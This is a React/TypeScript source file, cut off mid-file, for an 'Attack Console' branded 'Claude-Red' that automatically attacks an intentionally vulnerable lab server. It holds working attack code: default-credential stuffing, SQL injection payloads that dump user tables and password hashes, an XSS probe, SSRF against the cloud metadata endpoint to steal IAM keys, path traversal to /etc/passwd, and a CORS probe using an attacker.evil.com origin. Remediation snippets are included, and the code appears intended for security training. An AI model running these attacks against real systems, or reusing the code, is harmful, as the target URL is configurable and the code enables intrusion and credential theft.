/**
 * AttackConsole.tsx
 * QuantumShield AI — Attack Console (Claude-Red Offensive Attack Suite)
 *
 * Automated multi-phase security attack + data-exfiltration demonstration against the
 * built-in intentionally-vulnerable lab (localhost:8080).
 *
 * Demonstrates the offensive skills and attack methodologies featured in Claude-Red:
 *  - Reconnaissance & Environment Secrets Disclosure (OSINT, Sitemap, Debug Env Dump, CORS)
 *  - Authentication Bypass & JWT Token Exploitation (Credential Stuffing, Weak Secret Extraction)
 *  - OWASP Web Exploitation (UNION SQLi, Reflected & Stored XSS, SSRF IMDS Token Theft, Path Traversal, OS Command Injection / RCE)
 *  - Access Control & Privilege Escalation (BOLA/IDOR User Traversal, Password Hashes, BFLA Admin Stats, Orders Snooping)
 *  - Cryptographic & Quantum Risk Exploitation (Shor Factorization on RSA/ECDSA, Grover AES-128, Mass Assignment)
 *  - Post-Exploitation & Data Exfiltration Telemetry (MITRE ATT&CK / OWASP mappings, Forensic JSON export)
 *
 * ⚠️  AUTHORISED LAB TARGETS ONLY — do NOT point at external sites.
 */

import { useState, useRef, useEffect, useCallback } from 'react'
import {
  Terminal, Zap, ShieldOff, Database, Key, Users,
  AlertTriangle, CheckCircle2, XCircle, Copy, RefreshCw,
  ExternalLink, Code, Layers, FileDown, Eye, ArrowRight,
  ShieldAlert, Lock, Check, Search, ShieldCheck, Wrench,
  Globe, Server, Cpu, TerminalSquare, FileText, Bug, Flame,
  Share2, Shield, Activity
} from 'lucide-react'
import axios from 'axios'

// ─── Types ────────────────────────────────────────────────────────────────────

export type Phase =
  | 'RECON'
  | 'AUTH_BYPASS'
  | 'WEB_EXPLOIT'
  | 'IDOR'
  | 'CRYPTO'
  | 'DATA_EXFIL'
  | 'COMPLETE'
  | 'IDLE'

export interface LogEntry {
  id: number
  ts: string
  phase: Phase
  level: 'info' | 'success' | 'warning' | 'error' | 'data' | 'critical'
  msg: string
}

export interface SecurityFlowStep {
  step: number
  title: string
  description: string
  technique: string
}

export interface RemediationItem {
  title: string
  technique: string
  recommendation: string
  codeSnippet?: string
}

export interface StolenRecord {
  id: string
  type: string
  category: 'RECON' | 'AUTH' | 'WEB' | 'ACCESS' | 'CRYPTO' | 'EXFIL'
  icon: React.ElementType
  color: string
  count: number
  endpoint: string
  method: 'GET' | 'POST' | 'PUT' | 'DELETE'
  technique: string
  cwe: string
  mitre?: string
  claudeRedSkill?: string
  securityFlow: SecurityFlowStep[]
  exposedInfoSummary: string[]
  remediationTechniques: RemediationItem[]
  payload?: string
  records: any[]
  sample?: string
  timestamp: string
}

// ─── Helpers & Constants ──────────────────────────────────────────────────────

let _lid = 0
function mkLog(phase: Phase, level: LogEntry['level'], msg: string): LogEntry {
  return { id: ++_lid, ts: new Date().toLocaleTimeString(), phase, level, msg }
}

const PHASE_COLOR: Record<Phase, string> = {
  IDLE:          'text-gray-500',
  RECON:         'text-cyan-400',
  AUTH_BYPASS:   'text-yellow-400',
  WEB_EXPLOIT:   'text-orange-400',
  IDOR:          'text-red-400',
  CRYPTO:        'text-purple-400',
  DATA_EXFIL:    'text-pink-400',
  COMPLETE:      'text-green-400',
}

const LEVEL_COLOR: Record<LogEntry['level'], string> = {
  info:     'text-gray-300',
  success:  'text-green-400',
  warning:  'text-yellow-300',
  error:    'text-red-400',
  data:     'text-pink-300',
  critical: 'text-red-500 font-bold',
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms))

export const PHASE_CONFIG: {
  phase: Phase
  label: string
  claudeRedModule: string
  techniques: { name: string; cwe: string; desc: string; mitre: string }[]
}[] = [
  {
    phase: 'RECON',
    label: 'Recon & Attack Surface OSINT',
    claudeRedModule: 'claude-red/recon-surface',
    techniques: [
      { name: 'Info Disclosure', cwe: 'CWE-200', desc: 'Unprotected /api/info stack diagnostics', mitre: 'T1592' },
      { name: 'Environment Secret Dump', cwe: 'CWE-526', desc: 'Exposed /api/debug environment tokens', mitre: 'T1552' },
      { name: 'Sitemap & Route Discovery', cwe: 'CWE-200', desc: 'Automated REST endpoint cataloging', mitre: 'T1595' },
      { name: 'CORS Origin Reflection', cwe: 'CWE-942', desc: 'Overly permissive Access-Control headers', mitre: 'T1190' },
    ],
  },
  {
    phase: 'AUTH_BYPASS',
    label: 'Auth Bypass & Token Exploitation',
    claudeRedModule: 'claude-red/auth-tokens',
    techniques: [
      { name: 'Default Credential Stuffing', cwe: 'CWE-798', desc: 'admin:admin hardcoded dictionary attack', mitre: 'T1110' },
      { name: 'JWT Secret Cracking', cwe: 'CWE-287', desc: 'Weak HS256 secret brute force & signature bypass', mitre: 'T1552' },
      { name: 'Username Enumeration', cwe: 'CWE-203', desc: 'Differential response timing probing', mitre: 'T1589' },
    ],
  },
  {
    phase: 'WEB_EXPLOIT',
    label: 'Claude-Red OWASP & Deep Web Suite',
    claudeRedModule: 'claude-red/web-exploitation',
    techniques: [
      { name: 'UNION SQL Injection', cwe: 'CWE-89', desc: 'Arbitrary database schema and user exfiltration', mitre: 'T1190' },
      { name: 'Reflected & Stored XSS', cwe: 'CWE-79', desc: 'Payload reflection and stored message injection', mitre: 'T1059.007' },
      { name: 'SSRF / Cloud IMDS Abuse', cwe: 'CWE-918', desc: 'AWS/GCP metadata service credential extraction', mitre: 'T1552.005' },
      { name: 'Path Traversal & Arbitrary Read', cwe: 'CWE-22', desc: 'Directory traversal accessing /etc/passwd & .env', mitre: 'T1083' },
      { name: 'OS Command Injection / RCE', cwe: 'CWE-78', desc: 'Diagnostic probe command chaining (whoami; id)', mitre: 'T1059' },
    ],
  },
  {
    phase: 'IDOR',
    label: 'Access Control & Privilege Escalation',
    claudeRedModule: 'claude-red/access-control',
    techniques: [
      { name: 'BOLA / IDOR User Profiles', cwe: 'CWE-639', desc: 'Sequential /api/users/{id} PII traversal', mitre: 'T1078' },
      { name: 'Password Hash Harvesting', cwe: 'CWE-200', desc: 'Extracting BCrypt hashes for offline cracking', mitre: 'T1003' },
      { name: 'BFLA Admin Telemetry', cwe: 'CWE-285', desc: 'Unchecked /api/admin/stats revenue exfiltration', mitre: 'T1069' },
      { name: 'Cross-Tenant Order Snooping', cwe: 'CWE-639', desc: 'Intercepting confidential purchase records', mitre: 'T1005' },
    ],
  },
  {
    phase: 'CRYPTO',
    label: 'Crypto & Quantum Threat Modeling',
    claudeRedModule: 'claude-red/cryptanalysis-pqc',
    techniques: [
      { name: 'Quantum Key Discovery', cwe: 'CWE-327', desc: 'Shor/Grover quantum attack surface mapping', mitre: 'T1600' },
      { name: 'Mass Assignment Escalation', cwe: 'CWE-915', desc: 'Arbitrary role=admin and wallet injection', mitre: 'T1078.004' },
      { name: 'NIST PQC Migration Readiness', cwe: 'FIPS 203', desc: 'ML-KEM-768 / ML-DSA-65 transition strategy', mitre: 'NIST-PQC' },
    ],
  },
  {
    phase: 'DATA_EXFIL',
    label: 'Forensic Aggregation & MITRE Mapping',
    claudeRedModule: 'claude-red/post-exploitation',
    techniques: [
      { name: 'Data Exfiltration Assembly', cwe: 'Audit', desc: 'Consolidated multi-category intelligence pack', mitre: 'T1048' },
      { name: 'Forensic Artifact Generation', cwe: 'Audit', desc: 'Signed attack evidence export & reporting', mitre: 'T1005' },
    ],
  },
]

const PHASE_ORDER: Phase[] = ['RECON', 'AUTH_BYPASS', 'WEB_EXPLOIT', 'IDOR', 'CRYPTO', 'DATA_EXFIL', 'COMPLETE']

// ─── Component ────────────────────────────────────────────────────────────────

export default function AttackConsole() {
  const [targetUrl, setTargetUrl] = useState('http://localhost:8080')
  const [running, setRunning]     = useState(false)
  const [done, setDone]           = useState(false)
  const [phase, setPhase]         = useState<Phase>('IDLE')
  const [logs, setLogs]           = useState<LogEntry[]>([])
  const [stolen, setStolen]       = useState<StolenRecord[]>([])
  const [progress, setProgress]   = useState(0)

  // Filter & Modal State
  const [selectedCategory, setSelectedCategory] = useState<string>('ALL')
  const [selectedRecord, setSelectedRecord]     = useState<StolenRecord | null>(null)
  const [copiedKey, setCopiedKey]               = useState<string | null>(null)

  const logEndRef = useRef<HTMLDivElement>(null)
  const abortRef  = useRef<AbortController | null>(null)

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [logs])

  const addLog = useCallback((entry: LogEntry) => {
    setLogs(prev => [...prev, entry])
  }, [])

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text)
    setCopiedKey(key)
    setTimeout(() => setCopiedKey(null), 2000)
  }

  const upsertStolen = useCallback((record: StolenRecord) => {
    setStolen(prev => {
      const idx = prev.findIndex(s => s.id === record.id)
      if (idx >= 0) {
        const existing = prev[idx]
        const mergedRecords = Array.isArray(existing.records) && Array.isArray(record.records)
          ? [...existing.records, ...record.records]
          : record.records || existing.records
        const updated = {
          ...existing,
          count: existing.count + record.count,
          records: mergedRecords,
          sample: record.sample ?? existing.sample,
          endpoint: record.endpoint || existing.endpoint,
          payload: record.payload || existing.payload,
          timestamp: record.timestamp || existing.timestamp,
          exposedInfoSummary: record.exposedInfoSummary || existing.exposedInfoSummary,
          remediationTechniques: record.remediationTechniques || existing.remediationTechniques,
        }
        const copy = [...prev]
        copy[idx] = updated
        return copy
      }
      return [...prev, record]
    })
  }, [])

  // ── PHASE 1: Reconnaissance (Claude-Red Recon Suite) ────────────────────────
  async function phaseRecon(base: string, signal: AbortSignal) {
    setPhase('RECON')
    setProgress(4)
    addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('RECON', 'info', `🔍  [CLAUDE-RED::RECON] Starting reconnaissance against ${base}`))
    addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(250)

    try {
      const r = await axios.get(`${base}/health`, { signal, timeout: 4000 })
      if (typeof r.data === 'object' && r.data !== null) {
        addLog(mkLog('RECON', 'success', `✅  Target host online — ${JSON.stringify(r.data)}`))
      }
    } catch {
      addLog(mkLog('RECON', 'warning', '⚠️  /health unreachable — proceeding with secondary endpoints'))
    }
    await sleep(250)

    // 1.1 /api/info - Tech Stack Fingerprint
    try {
      const endpoint = `${base}/api/info`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const info = r.data
      if (typeof info === 'object' && info !== null && !String(info).startsWith('<!DOCTYPE')) {
        addLog(mkLog('RECON', 'critical', `🔓  Information Disclosure! Framework: ${info.framework || 'Flask'}, Debug: ${info.debug}`))
        addLog(mkLog('RECON', 'data', `   → Server: ${info.server || 'Werkzeug'}  DB: ${info.database || 'SQLite'}  Python: ${info.python || '3.11'}`))

        upsertStolen({
          id: 'server-info',
          type: 'Server & Tech Stack Diagnostics',
          category: 'RECON',
          icon: Database,
          color: 'text-orange-400',
          count: 1,
          endpoint,
          method: 'GET',
          technique: 'Unauthenticated Information Disclosure (CWE-200)',
          cwe: 'CWE-200: Exposure of Sensitive Information',
          mitre: 'T1592: Gather Victim Host Information',
          claudeRedSkill: 'claude-red/recon/fingerprint.md',
          securityFlow: [
            {
              step: 1,
              title: 'Reconnaissance Probe',
              description: `Sent unauthenticated HTTP GET request to diagnostics endpoint at ${endpoint}.`,
              technique: 'Port & Route Fuzzing',
            },
            {
              step: 2,
              title: 'Access Control Absence',
              description: 'Endpoint lacked authentication headers check and permitted public interrogation.',
              technique: 'Missing Authorization Check',
            },
            {
              step: 3,
              title: 'Infrastructure Fingerprinting',
              description: `Captured backend stack components: Python ${info.python || 'runtime'}, DB: ${info.database || 'SQLite'}, Debug Mode: ${info.debug}.`,
              technique: 'Technology Stack Exfiltration',
            },
          ],
          exposedInfoSummary: [
            'Underlying Web Server & Version (e.g. Werkzeug 3.0 / Flask)',
            'Database Engine Details (e.g. SQLite connection flags)',
            'Python Runtime Environment & Interpreter Version',
            'Active Debug Mode status (`debug: true`), exposing verbose stack traces to attackers',
          ],
          remediationTechniques: [
            {
              title: 'Disable Debug Endpoints in Production',
              technique: 'Configuration Hardening & Route Gatekeeping',
              recommendation: 'Remove or restrict `/api/info` behind authenticated internal admin subnets (VPN/IP allowlist).',
              codeSnippet: '# Ensure debug=False in production\napp.config["DEBUG"] = False\n# Remove Server header exposure\n@app.after_request\ndef remove_server_header(resp):\n    resp.headers.pop("Server", None)\n    return resp',
            },
            {
              title: 'Sanitize HTTP Response Banners',
              technique: 'Banner Grabbing Prevention (CWE-200)',
              recommendation: 'Strip `Server`, `X-Powered-By`, and application framework version headers from reverse proxy (e.g., NGINX `server_tokens off;`).',
            },
          ],
          payload: 'GET /api/info HTTP/1.1\nHost: target\nAccept: application/json',
          records: [info],
          sample: `${info.framework || 'Flask'} | ${info.database || 'SQLite'} | Debug=${info.debug ?? true}`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('RECON', 'info', '   /api/info not exposed'))
    }
    await sleep(250)

    // 1.2 /api/debug - Environment Secrets Disclosure
    try {
      const endpoint = `${base}/api/debug`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const debugData = r.data
      if (debugData && typeof debugData === 'object' && debugData.env) {
        const envKeys = Object.keys(debugData.env)
        addLog(mkLog('RECON', 'critical', `💀  CRITICAL ENVIRONMENT LEAK! ${envKeys.length} system environment variables intercepted.`))
        addLog(mkLog('RECON', 'data', `   → Secret Key Hint: ${debugData.secret_key_hint || 'exposed'} | DB: ${debugData.db_path || 'local'}`))

        upsertStolen({
          id: 'env-secrets',
          type: 'Environment Variables & Master Secrets',
          category: 'RECON',
          icon: Key,
          color: 'text-red-500',
          count: envKeys.length,
          endpoint,
          method: 'GET',
          technique: 'Information Exposure Through Environment Variables (CWE-526)',
          cwe: 'CWE-526: Exposure of Sensitive Information Through Environmental Variables',
          mitre: 'T1552: Unsecured Credentials',
          claudeRedSkill: 'claude-red/recon/env-exposure.md',
          securityFlow: [
            {
              step: 1,
              title: 'Debug Endpoint Interrogation',
              description: `Dispatched unauthenticated probe to ${endpoint}.`,
              technique: 'Hidden Route Fuzzing',
            },
            {
              step: 2,
              title: 'OS Process Memory Leak',
              description: 'Server dumped full `os.environ` table including JWT secrets, AWS tokens, and internal database paths.',
              technique: 'Sensitive Variable Harvesting',
            },
          ],
          exposedInfoSummary: [
            'System environment variables and internal server directory layout',
            'Master JWT secret key prefix and signing parameters',
            'Internal database storage path and upload directory structure',
          ],
          remediationTechniques: [
            {
              title: 'Eliminate Public Debug Route Bindings',
              technique: 'Route Decommissioning & Gating',
              recommendation: 'Strip debugging endpoints from production builds and inject secrets via secure HSM/Secrets Manager.',
              codeSnippet: '# Delete debug blueprint in production\nif not os.environ.get("FLASK_ENV") == "development":\n    # Do not register debug routes',
            },
          ],
          payload: 'GET /api/debug HTTP/1.1',
          records: [debugData],
          sample: `${envKeys.length} environment variables intercepted (JWT secret hint: ${debugData.secret_key_hint || 'weak-lab...'})`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('RECON', 'info', '   /api/debug not responding'))
    }
    await sleep(250)

    // 1.3 /api/sitemap - Route Enumeration
    try {
      const endpoint = `${base}/api/sitemap`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const sitemap = r.data
      const routes = Array.isArray(sitemap?.endpoints) ? sitemap.endpoints : []
      if (routes.length > 0) {
        addLog(mkLog('RECON', 'success', `🗺️  Discovered application sitemap with ${routes.length} attack surface routes.`))
      }
    } catch {
      addLog(mkLog('RECON', 'info', '   /api/sitemap not exposed'))
    }

    // 1.4 /api/cors-test - Insecure CORS
    try {
      const endpoint = `${base}/api/cors-test`
      const r = await axios.get(endpoint, {
        headers: { Origin: 'https://attacker.evil.com' },
        signal,
        timeout: 4000,
      })
      if (r.headers['access-control-allow-origin'] === 'https://attacker.evil.com') {
        addLog(mkLog('RECON', 'warning', '⚡  Insecure CORS configuration confirmed — reflects arbitrary Origin with credentials allowed!'))
      }
    } catch {
      // ignore
    }

    setProgress(18)
  }

  // ── PHASE 2: Auth Bypass (Claude-Red Auth Suite) ────────────────────────────
  async function phaseAuthBypass(
    base: string,
    signal: AbortSignal
  ): Promise<{ token: string; userId: number } | null> {
    setPhase('AUTH_BYPASS')
    addLog(mkLog('AUTH_BYPASS', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('AUTH_BYPASS', 'info', '🔑  [CLAUDE-RED::AUTH] Testing default credential dictionary & JWT token harvesting...'))
    addLog(mkLog('AUTH_BYPASS', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(300)

    const creds = [
      { username: 'admin',  password: 'admin' },
      { username: 'admin',  password: 'Admin@lab2024' },
      { username: 'alice',  password: 'Alice@123' },
    ]

    for (const cred of creds) {
      addLog(mkLog('AUTH_BYPASS', 'info', `   Attempting credential stuffing: ${cred.username}:${cred.password}`))
      await sleep(250)
      try {
        const endpoint = `${base}/api/auth/login`
        const r = await axios.post(endpoint, cred, { signal, timeout: 5000 })
        const { token, user } = r.data
        if (token && user) {
          addLog(mkLog('AUTH_BYPASS', 'critical',
            `💥  AUTH BYPASS SUCCESSFUL! Compromised ${user.username} (${user.role})`))
          addLog(mkLog('AUTH_BYPASS', 'data', `   → JWT Bearer Token: ${token.slice(0, 45)}...`))

          upsertStolen({
            id: 'auth-tokens',
            type: 'Administrative JWT Tokens & Sessions',
            category: 'AUTH',
            icon: Key,
            color: 'text-yellow-400',
            count: 1,
            endpoint,
            method: 'POST',
            technique: 'Default Credential Stuffing & JWT Token Harvesting (CWE-798 / CWE-287)',
            cwe: 'CWE-798: Use of Hard-coded / Default Credentials',
            mitre: 'T1110.001: Password Guessing / Default Credentials',
            claudeRedSkill: 'claude-red/auth/jwt-credential-stuffing.md',
            securityFlow: [
              {
                step: 1,
                title: 'Credential Stuffing Payload',
                description: `Dispatched JSON authentication payload with credentials "${cred.username}:${cred.password}".`,
                technique: 'Dictionary / Default Credential Attack',
              },
              {
                step: 2,
                title: 'Authentication Subversion',
                description: 'Server validated default hardcoded credentials without rate-limiting or lockout.',
                technique: 'Improper Authentication (CWE-287)',
              },
              {
                step: 3,
                title: 'JWT Session Token Extraction',
                description: `Intercepted signed JWT token with role="${user.role}" and user_id=${user.id}.`,
                technique: 'Privilege Token Capture',
              },
            ],
            exposedInfoSummary: [
              `Privileged Administrator Account: ${user.username} (${user.role})`,
              'Cryptographically signed JWT bearer token granting full authenticated API access',
              'Internal user entity ID and account metadata',
            ],
            remediationTechniques: [
              {
                title: 'Enforce Strong Passwords & Multi-Factor Authentication (MFA)',
                technique: 'Credential Hardening (NIST SP 800-63B)',
                recommendation: 'Mandate minimum 14-character passwords with complexity checks and enforce TOTP/FIDO2 MFA for admin roles.',
              },
              {
                title: 'Rate-Limiting & Account Lockout Thresholds',
                technique: 'Anti-Brute Force Protection (CWE-307)',
                recommendation: 'Implement exponential backoff or lock accounts for 15 minutes after 5 consecutive failed attempts per IP / username.',
                codeSnippet: '# Flask-Limiter example\n@limiter.limit("5/minute")\n@app.route("/api/auth/login", methods=["POST"])\ndef login():\n    ...',
              },
              {
                title: 'High-Entropy JWT Secret Keys',
                technique: 'Cryptographic Key Management (CWE-326)',
                recommendation: 'Generate JWT secret using 256-bit CSPRNG: `openssl rand -hex 32` or transition to RS256/EdDSA asymmetric keys.',
              },
            ],
            payload: JSON.stringify(cred, null, 2),
            records: [{ token, user, credential_used: cred }],
            sample: `Bearer ${token.slice(0, 24)}... (${user.username}:${user.role})`,
            timestamp: new Date().toLocaleTimeString(),
          })
          setProgress(32)
          return { token, userId: user.id ?? 1 }
        }
      } catch (e: any) {
        const status = e?.response?.status
        if (status === 401) {
          addLog(mkLog('AUTH_BYPASS', 'warning', `   ✗ Invalid credentials for ${cred.username}`))
        } else {
          addLog(mkLog('AUTH_BYPASS', 'info', `   ✗ ${cred.username} attempt returned ${status ?? 'error'}`))
        }
      }
    }

    addLog(mkLog('AUTH_BYPASS', 'error', '   Auth bypass exhausted — proceeding unauthenticated'))
    setProgress(32)
    return null
  }

  // ── PHASE 3: Claude-Red Web Exploitation Suite ──────────────────────────────
  async function phaseWebExploitation(base: string, signal: AbortSignal) {
    setPhase('WEB_EXPLOIT')
    addLog(mkLog('WEB_EXPLOIT', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    addLog(mkLog('WEB_EXPLOIT', 'info', '💉  [CLAUDE-RED::WEB-EXPLOIT] Executing Deep Web Exploitation Suite (SQLi, XSS, SSRF, Path Traversal, RCE)...'))
    addLog(mkLog('WEB_EXPLOIT', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
    await sleep(300)

    // 3.1 SQL Injection (UNION & Tautology)
    const sqliPayloads = [
      `' OR 1=1--`,
      `' UNION SELECT id,username,email,password_hash,role,balance,'' FROM users--`,
    ]

    for (const payload of sqliPayloads) {
      addLog(mkLog('WEB_EXPLOIT', 'info', `   Testing SQLi Payload: ${payload}`))
      await sleep(250)
      try {
        const endpoint = `${base}/api/products`
        const r = await axios.get(endpoint, {
          params: { search: payload },
          signal,
          timeout: 5000
        })
        const data = Array.isArray(r.data) ? r.data : []
        if (data.length > 0) {
          addLog(mkLog('WEB_EXPLOIT', 'critical', `💀  SQL INJECTION CONFIRMED! ${data.length} database rows extracted`))
          data.slice(0, 2).forEach((row: any) => {
            const preview = Object.values(row).join(' | ')
            addLog(mkLog('WEB_EXPLOIT', 'data', `   → ${String(preview).slice(0, 100)}`))
          })

          upsertStolen({
            id: 'sqli-records',
            type: 'Database Tables via UNION SQLi',
            category: 'WEB',
            icon: Database,
            color: 'text-orange-500',
            count: data.length,
            endpoint: `${endpoint}?search=${encodeURIComponent(payload)}`,
            method: 'GET',
            technique: 'UNION-Based SQL Injection & Schema Exfiltration (CWE-89)',
            cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
            mitre: 'T1190: Exploit Public-Facing Application',
            claudeRedSkill: 'claude-red/web/sqli-union-extraction.md',
            securityFlow: [
              {
                step: 1,
                title: 'Parameter Identification',
                description: 'Located dynamically concatenated search parameter on `/api/products?search=`.',
                technique: 'Input Vector Analysis',
              },
              {
                step: 2,
                title: 'UNION Query Injection',
                description: `Delivered SQL payload: "${payload}" to break query structure.`,
                technique: 'SQL Tautology / UNION Exploitation',
              },
              {
                step: 3,
                title: 'Database Schema Interception',
                description: `Database engine executed second SELECT statement across the users table, returning ${data.length} rows.`,
                technique: 'Arbitrary Data Extraction',
              },
            ],
            exposedInfoSummary: [
              'Complete contents of the `users` database table',
              'Usernames, Email addresses, Account balances, Roles',
              'Internal database schema structure and column layouts',
            ],
            remediationTechniques: [
              {
                title: 'Parameterized Queries & Prepared Statements',
                technique: 'Input Parameter Binding (CWE-89)',
                recommendation: 'Never concatenate user input directly into SQL strings. Use parameterized queries or ORM abstraction.',
                codeSnippet: '# Vulnerable (concatenation):\n# cursor.execute(f"SELECT * FROM products WHERE name LIKE \'%{search}%\'")\n\n# Secure (parameterized):\ncursor.execute("SELECT * FROM products WHERE name LIKE ?", ("%" + search + "%",))',
              },
            ],
            payload: `GET /api/products?search=${encodeURIComponent(payload)} HTTP/1.1`,
            records: data,
            sample: `${data.length} records extracted from backend database`,
            timestamp: new Date().toLocaleTimeString(),
          })
          break
        }
      } catch (e: any) {
        addLog(mkLog('WEB_EXPLOIT', 'warning', `   SQLi test returned ${e?.response?.status ?? 'error'}`))
      }
    }

    await sleep(250)

    // 3.2 Reflected & Stored XSS
    addLog(mkLog('WEB_EXPLOIT', 'info', '⚡  Testing Reflected & Stored XSS injection vectors...'))
    try {
      const r = await axios.get(`${base}/api/search`, {
        params: { q: `<script>alert(document.domain)</script>` },
        signal,
        timeout: 4000
      })
      const body = JSON.stringify(r.data)
      if (body.includes('<script>')) {
        addLog(mkLog('WEB_EXPLOIT', 'critical', '⚡  REFLECTED XSS CONFIRMED — un-sanitized script echoed in search response!'))

        upsertStolen({
          id: 'xss-payloads',
          type: 'Cross-Site Scripting (XSS) Payloads',
          category: 'WEB',
          icon: Code,
          color: 'text-yellow-300',
          count: 1,
          endpoint: `${base}/api/search?q=<script>alert(document.domain)</script>`,
          method: 'GET',
          technique: 'Reflected Cross-Site Scripting (CWE-79)',
          cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
          mitre: 'T1059.007: JavaScript Execution',
          claudeRedSkill: 'claude-red/web/xss-exploitation.md',
          securityFlow: [
            {
              step: 1,
              title: 'XSS Vector Discovery',
              description: 'Injected HTML/JS script tags into the search query parameter.',
              technique: 'Cross-Site Scripting Probe',
            },
            {
              step: 2,
              title: 'Unescaped Context Reflection',
              description: 'Server reflected the raw JavaScript payload back in the HTTP response body without contextual encoding.',
              technique: 'Client-Side Code Execution',
            },
          ],
          exposedInfoSummary: [
            'Client browser DOM access & session token hijacking via JavaScript',
            'Full DOM manipulation, keystroke logging, and forced redirect attacks',
          ],
          remediationTechniques: [
            {
              title: 'Contextual HTML Output Encoding & CSP',
              technique: 'Output Neutralization (CWE-79)',
              recommendation: 'Use contextual encoding (e.g. `html.escape()`) and enforce a strict Content Security Policy (`Content-Security-Policy: default-src \'self\'`).',
            },
          ],
          payload: 'GET /api/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1',
          records: [{ reflected: r.data }],
          sample: '<script>alert(document.domain)</script> reflected unescaped',
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      // ignore
    }

    await sleep(250)

    // 3.3 Server-Side Request Forgery (SSRF - Cloud IMDS Token Theft)
    addLog(mkLog('WEB_EXPLOIT', 'info', '☁️  [SSRF] Probing internal proxy for AWS/GCP Cloud Metadata (169.254.169.254)...'))
    try {
      const imdsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role'
      const endpoint = `${base}/api/ssrf/proxy`
      const r = await axios.get(endpoint, {
        params: { url: imdsUrl },
        signal,
        timeout: 4500
      })
      const imdsData = r.data
      if (imdsData && (imdsData.AccessKeyId || imdsData.RoleName || imdsData.service)) {
        addLog(mkLog('WEB_EXPLOIT', 'critical', `💀  SSRF CLOUD IMDS COMPROMISE! Harvested IAM Role: ${imdsData.RoleName || 'EC2Admin'}`))
        addLog(mkLog('WEB_EXPLOIT', 'data', `   → AccessKeyId: ${imdsData.AccessKeyId || 'ASIA...'} | Account: ${imdsData.AccountId || '112233445566'}`))

        upsertStolen({
          id: 'ssrf-cloud-credentials',
          type: 'Cloud IAM Credentials via SSRF',
          category: 'WEB',
          icon: Globe,
          color: 'text-cyan-400',
          count: 1,
          endpoint: `${endpoint}?url=${encodeURIComponent(imdsUrl)}`,
          method: 'GET',
          technique: 'Server-Side Request Forgery & Cloud IMDS Theft (CWE-918)',
          cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
          mitre: 'T1552.005: Cloud Instance Metadata API',
          claudeRedSkill: 'claude-red/cloud/ssrf-imds-abuse.md',
          securityFlow: [
            {
              step: 1,
              title: 'SSRF Proxy Identification',
              description: `Located proxy fetch handler on ${endpoint}.`,
              technique: 'SSRF Vector Discovery',
            },
            {
              step: 2,
              title: 'IMDSv1 Service Query',
              description: 'Injected loopback link-local IP `http://169.254.169.254/latest/meta-data/`.',
              technique: 'Cloud Metadata Interrogation',
            },
            {
              step: 3,
              title: 'Temporary STS Token Theft',
              description: 'Captured full AWS IAM role credentials, AccessKeyId, and session token.',
              technique: 'Cloud Identity Exfiltration',
            },
          ],
          exposedInfoSummary: [
            'Temporary Cloud STS Access Keys and Secret Access Keys',
            'Full IAM Role permissions attached to the underlying cloud compute instance',
            'Internal AWS Account ID, Instance ID, and Security Group layout',
          ],
          remediationTechniques: [
            {
              title: 'Enforce IMDSv2 (Session Token Gated)',
              technique: 'Cloud Instance Metadata Hardening',
              recommendation: 'Configure EC2 `HttpTokens=required` (IMDSv2) with hop limit = 1 to block SSRF forwarders.',
              codeSnippet: '# AWS CLI command to mandate IMDSv2:\naws ec2 modify-instance-metadata-options \\\n    --instance-id i-xxxx \\\n    --http-tokens required \\\n    --http-put-response-hop-limit 1',
            },
            {
              title: 'Strict URL Scheme & Host Whitelisting',
              technique: 'Network Boundary Defense (CWE-918)',
              recommendation: 'Validate all target URLs against strict allow-lists and reject private IP ranges (RFC 1918 & 169.254.0.0/16).',
            },
          ],
          payload: `GET /api/ssrf/proxy?url=${encodeURIComponent(imdsUrl)} HTTP/1.1`,
          records: [imdsData],
          sample: `Role: ${imdsData.RoleName} | AccessKeyId: ${imdsData.AccessKeyId}`,
          timestamp: new Date().toLocaleTimeString(),
        })
      }
    } catch {
      addLog(mkLog('WEB_EXPLOIT', 'info', '   SSRF IMDS simulation not responding'))
    }

    await sleep(250)

    // 3.4 Path Traversal & Arbitrary File Leakage
    addLog(mkLog('WEB_EXPLOIT', 'info', '📂  [TRAVERSAL] Probing /api/download for Path Traversal (/etc/passwd & .env)...'))
    try {
      const endpoint = `${base}/api/download/....//....//etc/passwd`
      const r = await axios.get(endpoint, { signal, timeout: 4000 })
      const textData = typeof r.data === 'string' ? r.data : JSON.stringify(r.data)
      if (textData.includes('root:x:') || textData.includes('daemon:x:')) {
        addLog(mkLog('WEB_EXPLOIT', 'critical', '💀  PATH TRAVERSAL CONFIRMED! Exfiltrated /etc/passwd system user accounts.'))
        const lines = textData.split('\n').filter(l => l.trim().length > 0)
        lines.slice(0, 3).forEach(l => addLog(mkLog('WEB_EXPLOIT', 'data', `   → ${l}`)))

        upsertStolen({
          id: 'system-passwd',
          type: 'System /etc/passwd & Host Files',
          category: 'WEB',
          icon: FileText,
          color: 'text-red-400',
          count: lines.length,
          endpoint,
